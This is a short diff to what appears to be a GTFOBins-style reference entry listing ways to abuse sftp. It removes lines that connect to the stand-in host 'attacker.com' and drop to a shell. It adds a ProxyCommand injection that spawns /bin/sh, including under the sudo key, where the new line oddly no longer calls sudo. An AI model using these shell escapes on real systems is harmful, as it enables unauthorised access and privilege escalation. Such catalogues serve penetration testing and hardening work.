@@ -2,9 +2,7 @@
 functions:
   shell:
     - code: |
-        HOST=user@attacker.com
-        sftp $HOST
-        !/bin/sh
+        sftp -o ProxyCommand=';/bin/sh 0<&2 1>&2' x
   file-upload:
     - description: Send local file to a SSH server.
       code: |
@@ -19,7 +17,5 @@ functions:
         get file_to_get file_to_save
   sudo:
     - code: |
-        HOST=user@attacker.com
-        sudo sftp $HOST
-        !/bin/sh
+        sftp -o ProxyCommand=';/bin/sh 0<&2 1>&2' x
 ---
